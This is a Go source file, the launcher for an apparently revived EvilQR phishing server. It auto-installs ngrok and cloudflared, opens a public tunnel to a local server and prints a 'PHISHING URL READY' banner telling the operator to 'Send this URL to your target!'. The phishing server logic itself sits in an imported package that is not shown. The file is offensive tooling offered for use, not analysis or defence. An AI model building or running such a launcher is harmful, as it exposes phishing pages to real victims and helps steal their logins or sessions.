package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"time"

	"evilqr-server/core"
	"evilqr-server/log"
)

const (
	binDir = "./bin"
)

func ensureDir(dir string) error {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		return os.MkdirAll(dir, 0755)
	}
	return nil
}

func downloadFile(url, filepath string) error {
	fmt.Printf("  [*] Downloading %s...\n", url)
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func installNgrok() error {
	var url string
	var filename string
	if runtime.GOOS == "windows" {
		url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
		filename = filepath.Join(binDir, "ngrok.zip")
	} else {
		url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
		filename = filepath.Join(binDir, "ngrok.tgz")
	}

	if err := downloadFile(url, filename); err != nil {
		return err
	}

	fmt.Println("  [*] Extracting Ngrok...")
	if runtime.GOOS == "windows" {
		exec.Command("powershell", "-Command", fmt.Sprintf("Expand-Archive -Path %s -DestinationPath %s -Force", filename, binDir)).Run()
	} else {
		exec.Command("tar", "-xzf", filename, "-C", binDir).Run()
	}
	os.Remove(filename)
	return nil
}

func installCloudflared() error {
	var url string
	var filename string
	if runtime.GOOS == "windows" {
		url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
		filename = filepath.Join(binDir, "cloudflared.exe")
	} else {
		url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
		filename = filepath.Join(binDir, "cloudflared")
	}

	if err := downloadFile(url, filename); err != nil {
		return err
	}

	if runtime.GOOS != "windows" {
		os.Chmod(filename, 0755)
	}
	return nil
}

func ensureDependencies() {
	ensureDir(binDir)
	absBinDir, _ := filepath.Abs(binDir)
	pathSep := ":"
	if runtime.GOOS == "windows" {
		pathSep = ";"
	}
	os.Setenv("PATH", absBinDir+pathSep+os.Getenv("PATH"))

	_, errNg := exec.LookPath("ngrok")
	if errNg != nil {
		fmt.Println("  [!] Ngrok not found. Starting automatic installation...")
		if err := installNgrok(); err != nil {
			fmt.Printf("  [!] Failed to install Ngrok: %v\n", err)
		} else {
			fmt.Println("  [+] Ngrok installed successfully!")
		}
	}

	_, errCf := exec.LookPath("cloudflared")
	if errCf != nil {
		fmt.Println("  [!] Cloudflared not found. Starting automatic installation...")
		if err := installCloudflared(); err != nil {
			fmt.Printf("  [!] Failed to install Cloudflared: %v\n", err)
		} else {
			fmt.Println("  [+] Cloudflared installed successfully!")
		}
	}
}

var wwwdir = flag.String("d", "", "www content directory path")

func clearScreen() {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		cmd.Run()
	} else {
		fmt.Print("\033[H\033[2J")
	}
}

func printBanner() {
	fmt.Println()
	fmt.Println("  ███████╗██╗   ██╗██╗██╗      ██████╗ ██████╗")
	fmt.Println("  ██╔════╝██║   ██║██║██║     ██╔═══██╗██╔══██╗")
	fmt.Println("  █████╗  ██║   ██║██║██║     ██║   ██║██████╔╝")
	fmt.Println("  ██╔══╝  ╚██╗ ██╔╝██║██║     ██║▄▄ ██║██╔══██╗")
	fmt.Println("  ███████╗ ╚████╔╝ ██║███████╗╚██████╔╝██║  ██║")
	fmt.Println("  ╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚══▀▀═╝ ╚═╝  ╚═╝")
	fmt.Println()
	fmt.Println("  ─────────────────────────────────────────────────────────────")
	fmt.Println("  Original by : Kuba Gretzky (@mrgretzky) | breakdev.org")
	fmt.Println("  Revival by  : OP AMINUL FF | youtube.com/@OPAMINULFF")
	fmt.Println("  ─────────────────────────────────────────────────────────────")
	fmt.Println()
}

func printMenu() {
	fmt.Println("  ┌─────────────────────────────────────────────┐")
	fmt.Println("  │          SELECT TUNNEL MODE                 │")
	fmt.Println("  ├─────────────────────────────────────────────┤")
	fmt.Println("  │  [1] Localhost  (127.0.0.1:35000)           │")
	fmt.Println("  │  [2] Ngrok      (ngrok must be installed)   │")
	fmt.Println("  │  [3] Cloudflare (cloudflared required)      │")
	fmt.Println("  └─────────────────────────────────────────────┘")
	fmt.Println()
	fmt.Print("  >> Enter choice (1/2/3): ")
}

// getNgrokURL queries Ngrok's local API to get the public URL
func getNgrokURL() (string, error) {
	type NgrokTunnel struct {
		PublicURL string `json:"public_url"`
	}
	type NgrokResponse struct {
		Tunnels []NgrokTunnel `json:"tunnels"`
	}

	for i := 0; i < 10; i++ {
		resp, err := http.Get("http://127.0.0.1:4040/api/tunnels")
		if err == nil {
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			var ngrokResp NgrokResponse
			if json.Unmarshal(body, &ngrokResp) == nil {
				for _, t := range ngrokResp.Tunnels {
					if strings.HasPrefix(t.PublicURL, "https://") {
						return t.PublicURL, nil
					}
				}
				if len(ngrokResp.Tunnels) > 0 {
					return ngrokResp.Tunnels[0].PublicURL, nil
				}
			}
		}
		fmt.Printf("  [*] Waiting for Ngrok... (%d/10)\r", i+1)
		time.Sleep(1500 * time.Millisecond)
	}
	return "", fmt.Errorf("could not get Ngrok URL after 15 seconds")
}

func startNgrok() string {
	fmt.Println()
	fmt.Println("  [*] Starting Ngrok tunnel on port 35000...")

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		// On Windows, run ngrok in background (hidden) — we'll get URL from API
		cmd = exec.Command("ngrok", "http", "35000", "--log=stdout")
	} else {
		cmd = exec.Command("ngrok", "http", "35000", "--log=stdout")
	}

	cmd.Stdout = io.Discard
	cmd.Stderr = io.Discard
	err := cmd.Start()
	if err != nil {
		fmt.Println()
		fmt.Println("  [!] ERROR: Could not start Ngrok.")
		fmt.Println("  [!] Install it from: https://ngrok.com/download")
		fmt.Println("  [!] Then run: ngrok config add-authtoken YOUR_TOKEN")
		fmt.Println("  [!] Falling back to Localhost mode...")
		fmt.Println()
		return ""
	}

	fmt.Println()
	fmt.Println("  [*] Waiting for Ngrok to initialize...")
	publicURL, err := getNgrokURL()
	if err != nil {
		fmt.Println()
		fmt.Println("  [!] Could not retrieve Ngrok URL. Check if Ngrok is authenticated.")
		fmt.Println("  [!] Falling back to Localhost mode...")
		fmt.Println()
		return ""
	}

	return publicURL
}

func startCloudflare() string {
	fmt.Println()
	fmt.Println("  [*] Starting Cloudflare Tunnel on port 35000...")

	cmd := exec.Command("cloudflared", "tunnel", "--url", "http://localhost:35000")

	// Capture stderr because cloudflared prints URL to stderr
	stderr, err := cmd.StderrPipe()
	if err != nil {
		fmt.Println("  [!] ERROR: Could not start cloudflared.")
		return ""
	}
	cmd.Stdout = io.Discard

	err = cmd.Start()
	if err != nil {
		fmt.Println()
		fmt.Println("  [!] ERROR: Could not start cloudflared.")
		fmt.Println("  [!] Install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/")
		fmt.Println("  [!] Falling back to Localhost mode...")
		fmt.Println()
		return ""
	}

	// Parse cloudflared output to find the public URL
	urlPattern := regexp.MustCompile(`https://[a-zA-Z0-9\-]+\.trycloudflare\.com`)
	publicURL := ""
	done := make(chan bool)

	go func() {
		scanner := bufio.NewScanner(stderr)
		for scanner.Scan() {
			line := scanner.Text()
			if match := urlPattern.FindString(line); match != "" {
				publicURL = match
				done <- true
				return
			}
		}
		done <- false
	}()

	fmt.Println("  [*] Waiting for Cloudflare tunnel to initialize...")

	select {
	case success := <-done:
		if !success || publicURL == "" {
			fmt.Println("  [!] Could not retrieve Cloudflare URL.")
			fmt.Println("  [!] Falling back to Localhost mode...")
			return ""
		}
	case <-time.After(20 * time.Second):
		fmt.Println("  [!] Timeout waiting for Cloudflare URL.")
		fmt.Println("  [!] Falling back to Localhost mode...")
		return ""
	}

	return publicURL
}

func printPublicURL(publicURL string) {
	if publicURL == "" {
		fmt.Println("  ┌────────────────────────────────────────────────────────┐")
		fmt.Println("  │  LOCAL URL  : http://127.0.0.1:35000                  │")
		fmt.Println("  └────────────────────────────────────────────────────────┘")
	} else {
		fmt.Println()
		fmt.Println("  ╔════════════════════════════════════════════════════════╗")
		fmt.Println("  ║              🌐 PHISHING URL READY                    ║")
		fmt.Println("  ╠════════════════════════════════════════════════════════╣")
		fmt.Printf("  ║  PUBLIC URL : %-41s║\n", publicURL)
		fmt.Println("  ╠════════════════════════════════════════════════════════╣")
		fmt.Println("  ║  ✅ Send this URL to your target!                     ║")
		fmt.Println("  ╚════════════════════════════════════════════════════════╝")
	}
	fmt.Println()
}

func main() {
	flag.Parse()

	clearScreen()
	printBanner()

	fmt.Println("  [*] Checking dependencies...")
	ensureDependencies()
	fmt.Println("  [+] Dependencies OK!")
	time.Sleep(1 * time.Second)
	clearScreen()
	printBanner()

	if *wwwdir == "" {
		log.Error("you need to set up www content directory path with '-d' parameter")
		return
	}

	printMenu()

	reader := bufio.NewReader(os.Stdin)
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	fmt.Println()

	publicURL := ""

	switch choice {
	case "2":
		publicURL = startNgrok()
	case "3":
		publicURL = startCloudflare()
	default:
		fmt.Println("  [*] Starting in Localhost mode...")
	}

	fmt.Println()
	fmt.Println("  ─────────────────────────────────────────────────────────")
	log.Info("Server starting on http://%s", core.BIND_ADDRESS)
	fmt.Println("  ─────────────────────────────────────────────────────────")

	printPublicURL(publicURL)

	httpServer, err := core.NewHttpServer()
	if err != nil {
		log.Error("http: %s", err)
		return
	}
	httpServer.Run(*wwwdir)
}
